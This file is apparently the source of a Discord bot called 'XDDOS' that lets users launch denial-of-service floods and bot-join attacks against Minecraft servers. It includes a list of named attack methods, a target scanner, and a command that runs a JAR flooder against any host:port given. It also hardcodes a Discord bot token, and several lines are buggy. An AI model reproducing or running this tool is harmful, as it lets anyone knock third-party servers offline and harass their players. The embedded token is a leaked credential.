import json
import subprocess,psutil,platform
from urllib.request import urlopen
import discord
import threading
from discord.ext import commands
import os
import random
token = "MTA0ODEyODI1ODk0MTY2NTM3MQ.GlX5Zb.zow7O8x5YBQxDBKFV0-3xQ2eTvQaDu_7SYgr_I"
BotChannelId = 1048128915241185290
ProxyBotChannelId = 1048128965824495696
client = commands.Bot(command_prefix='xd!',intents=discord.Intents.all()) 
colors = [0xFFE4E1, 0x00FF7F, 0xD8BFD8, 0xDC143C, 0xFF4500, 0xDEB887, 0xADFF2F, 0x800000, 0x4682B4, 0x006400, 0x808080, 0xA0522D, 0xF08080, 0xC71585, 0xFFB6C1, 0x00CED1]
client.remove_command('help')
SupportedMethods = ['bigpacket', 'botjoiner', 'botraid', 'doublejoin', 'emptypacket', 'xdspam', 'handshake', 'invaliddata', 'invalidspoof', 'invalidnames', 'spoof', 'join', 'legacyping', 'legitnamejoin', 'localhost', 'pingjoin', 'longhost', 'longnames', 'nullping', 'ping', 'query', 'randompacket', 'bighandshake', 'unexpectedpacket', 'memory', 'network', 'extremejoin', 'nettydowner', 'ram', 'yoonikscry', 'colorcrasher', 'tcphit', 'queue', 'tcpbypass', 'ultimatesmasher', 'sf', 'nabcry', 'xdjoin', 'ipSpooffflood', 'chatspam', 'cpudowner','extremekiller', 'instantdowner', 'motd', 'newnullping', 'quitexceptions', 'randomexceptions', 'slapper', 'smartbot', 'ultimatekiller', 'waterfallbypass', 'emptynames', 'uuidcrash', 'bungeedowner', 'beta','ram']
SupportedProtocols = ['760', '759', '758', '757', '756', '755', '754', '753', '751', '736', '735', '578',' 575', '573', '498', '490', '485', '480', '477', '404', '401', '393', '340', '338 ', '335', '316', '210', '110', '109', '107', '47']
ProtocolsList = ['1.19.1/1.19.2: 760','1.19: 759','1.18.2: 758', '1.18.1/1.18: 757', '1.17.1: 756', '1.17: 755', '1.16.5/1.16.4: 754', '1.16.3: 753', '1.16.2: 751', '1.16.1: 736', '1.16: 735', '1.15.2: 578', '1.15.1: 575', '1.15: 573', '1.14.4: 498', '1.14.3: 490', '1.14.2: 485', '1.14.1: 480', '1.14: 477', '1.13.2: 404', '1.13.1: 401', '1.13: 393', '1.12.2: 340', '1.12.1: 338', '1.12: 335', '1.11.2/1.11.1: 316', '1.11: 315' '1.10.2/1.10.1: 210', '1.9.4/1.9.3: 110', '1.9.2: 109', '1.9.1: 107', '1.8.9/1.8.8/1.8.7/1.8.6/1.8.5/1.8.4/1.8.3/1.8.2/1.8.1/1.8: 47']
@client.command()
async def scan(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urlopen(url=f"{url}")
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)
    if json_object["online"] == False:
      embed = discord.Embed(
        title='**❌ ERROR**',
        description=f'⛔Can`t resolve information about Minecraft server {arg1} because this Minecraft server is offline or not found.',
        color=discord.Colour.random()
      )
      embed.set_image(url="https://i.gifer.com/origin/3a/3ad09d4905511990cccc98d904bd1e94.gif")
      await ctx.reply(embed=embed)
      return
    if json_object["online"] == True:
     e = discord.Embed(
      title="**✅ RESOLVED SUCCESSFULLY ✅**",  
      description=f'💥Successfully resolved information about {arg1}💥',
      color=discord.Colour.random()
    )
    e.add_field(name='**💡 ONLINE:**', value=json_object["online"], inline=True)
    e.add_field(name='**🔥 IP:**', value=json_object["ip"], inline=True)
    e.add_field(name='**💦 PORT:**', value=json_object["port"], inline=True)
    e.add_field(name='**🎫 VERSION:**', value=f'{json_object["version"]} (Protocol: {json_object["protocol"]})', inline=True)
    e.add_field(name='**👶 PLAYERS:**', value=json_object["players"], inline=True)
    e.set_field(name='**MOTD**', value=json_object["MOTD"])
    await ctx.reply(embed=e)
@client.event
async def on_command_error(ctx,error):
  if isinstance(error, commands.CommandNotFound):
    Embedika = discord.Embed(
      title='**❌ ERROR**',
      description=f'🔍❓ Command not found. See all commands by typing xd!information',
      color=discord.Colour.random()
    )
    await ctx.reply(embed=Embedika)
@client.command()
async def help(ctx):
    embed = discord.Embed(title="XDDOS Help")
    embed.add_field(name="!attack", value="!attack [ip:port] [protocol] [method]")
    embed.add_field(name="!methods", value="!methods : Shows Attack Methods")
    embed.add_field(name="!protocols", value="Shows Every Minecraft's Version's Protocols")
    embed.add_field(name="!scan", value="Scans Domains | Usuage : Scan [DomainName]")
    await ctx.reply(embed=embed)
@client.command()
async def protocols(ctx):
    embed = discord.Embed(title="Protocol List", description="Protocol Is The Version in which the bot is gonna join in (Protocols Are Important because of the bot cant join cause of his version then it will do nothing")
    embed.add_field(name= "1.19.X", value= "760", inline=True)
    embed.add_field(name= "1.19", value= "759", inline=True)
    embed.add_field(name= "1.18.2", value= "758", inline=True)
    embed.add_field(name= "1.18.X", value= "757", inline=True) 
    embed.add_field(name= "1.17.X", value= "756", inline=True)
    embed.add_field(name= "1.16.5", value= "754", inline=True)
    embed.add_field(name= "1.16.3", value= "753", inline=True)
    embed.add_field(name= "1.16.2", value= "751", inline=True)
    embed.add_field(name= "1.16.1", value= "736", inline=True)
    embed.add_field(name= "1.16", value= "735", inline=True)
    embed.add_field(name= "1.15.2", value= "578", inline=True)
    embed.add_field(name= "1.15.1", value= "575", inline=True)
    embed.add_field(name= "1.15", value= "573", inline=True)
    embed.add_field(name= "1.14.4", value= "498", inline=True)
    embed.add_field(name= "1.14.3", value= "490", inline=True)
    embed.add_field(name= "1.14.2", value= "485", inline=True)
    embed.add_field(name= "1.14.1", value= "480", inline=True)
    embed.add_field(name= "1.14", value= "477", inline=True)
    embed.add_field(name= "1.13.2", value= "404", inline=True)
    embed.add_field(name= "1.13.1", value= "401", inline=True)
    embed.add_field(name= "1.13", value= "393", inline=True)
    embed.add_field(name= "1.12.X", value= "340", inline=True)
    embed.add_field(name= "1.10.X", value= "210", inline=True)
    embed.add_field( name= "1.9.X", value= "110", inline=True)
    embed.add_field(name= "1.8.X", value= "47", inline=True)
    await ctx.reply(embed=embed)
@client.command()
async def methods(methods):
    embed = discord.Embed(title="XDDOS Methods")
    embed.add_field(name="BotJoiningMethods", value="botjoiner , botraid, doublejoin, xdspam, handshake, invalidspoof, invalidnames, join, legitnamejoin , localhost, pingjoin, longnames, extremejoin, xdjoin, ipSpooffflood, chatspam, emptynames.")
    embed.add_field(name="MotdMethods", value="bigpacket, emptypacket , invaliddata , invalidspoof, spoof, legacyping, nullping, query, randompacket, bighandshake, unexpectedpacket, memory, network, nettydowner, ram, yonkiscry, colorcrasher, qeue, ultimatesmasher, sf, nabcry, cpudowner, extremekiller, instanddowner, motd, newnullping, quitexecptions, randomexeptions, slapper, ultimatekiller, ram")
    embed.add_field(name="MotdMethods", value="tcphit, tcpbypass, smartbot, waterfallbypass, uuidcrash, beta, bungeedowner")
    await methods.reply(embed=embed)

@client.command()
async def attack(ctx, arg1, arg2, arg3):  
    def attack():
            subprocess.Popen(
                f"screen -d -m java -jar XDDOS.jar {arg1} {arg2} nettydowner 120 25000 n")
    embed = discord.Embed(title=f'>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)
    embed.add_field(name='**🎪 HOST:**', value=f'{arg1}', inline=True)
    embed.add_field(name='**🎫 PROTOCOL:**', value=f'{arg2}', inline=True)
    embed.add_field(name='**🧨 METHOD:**', value=f'{arg3}', inline=True)
    embed.add_field(name='**⏱ TIME:**', value=f'120 Seconds', inline=True)
    embed.add_field(name='**💪 Premium Network**', value='FULL POWER', inline=True) 

    if str(arg3) not in SupportedMethods:
        embed = discord.Embed(
      title=f"**❌ ERROR**",
      description=f"🧨❓ Method not found. See all attack methods in xd!methods",
      color=discord.Colour.random()
    )
        embed.set_image(url="https://i.gifer.com/origin/3a/3ad09d4905511990cccc98d904bd1e94.gif")
        await ctx.send(embed=embed)
        return


    if arg2 not in SupportedProtocols:
        embed = discord.Embed(
      title=f"**❌ ERROR**",
      description=f"🧨❓ Protocol not found. See all Available Protocols in xd!protocols",
      color=discord.Colour.random()
    )
        await ctx.send(embed=embed)
        return

    if ctx.message.channel.id != BotChannelId :
        embed = discord.Embed(
      title=f"**❌ ERROR**",
      description=f"💬❌ Invalid chat. You can use bot in <#{BotChannelId}>.",
      color=discord.Colour.random()
    )
        await ctx.send(embed-embed)
    t1 = threading.Thread(target=attack)

    t1.start()

    await ctx.send(embed=embed)
@client.command()
async def proxy(ctx):
  await ctx.reply("Proxies Refreshed")
  os.system(f'screen -d -m python proxy.py')
client.run(token) 
